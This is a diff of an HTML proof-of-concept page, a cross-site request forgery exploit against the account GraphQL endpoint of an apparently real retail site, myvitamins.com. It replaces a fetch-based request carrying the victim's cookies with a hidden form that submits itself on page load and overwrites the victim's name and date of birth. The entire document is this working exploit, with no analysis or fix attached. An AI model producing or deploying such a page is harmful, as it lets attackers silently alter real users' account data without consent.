@@ -1,49 +1,20 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>CSRF PoC: Update Account Details</h2>
-    <button onclick="sendCSRF()">Submit CSRF Request</button>
-    <p id="status"></p>
-
-    <script>
-      function sendCSRF() {
-        fetch("https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails", {
-          method: "POST",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            query: `mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
-              updateAccountSettings(input: $input) {
-                error
-                fieldErrors {
-                  fieldName
-                  validators
-                  requiredButNotProvided
-                  invalidOption
-                }
-              }
-            }`,
-            variables: {
-              input: [
-                { fieldName: "fullName", value: "Tester" },
-                { fieldName: "dateOfBirth", value: "03-03-2003" }
-              ]
-            }
-          })
-        })
-        .then(res => {
-          if (!res.ok) throw new Error("Request failed");
-          return res.text();
-        })
-        .then(data => {
-          document.getElementById("status").textContent = "CSRF Sent Successfully!";
-        })
-        .catch(err => {
-          document.getElementById("status").textContent = "Error: " + err;
-        });
-      }
-    </script>
+  <body onload="document.forms[0].submit()">
+    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" enctype="text/plain">
+      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
+        updateAccountSettings(input: $input) {
+          error
+          fieldErrors {
+            fieldName
+            validators
+            requiredButNotProvided
+            invalidOption
+          }
+        }
+      }'>
+      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Tester"},{"fieldName":"dateOfBirth","value":"01-01-2001"}]}'>
+      <input type="submit" value="Submit CSRF">
+    </form>
   </body>
 </html>
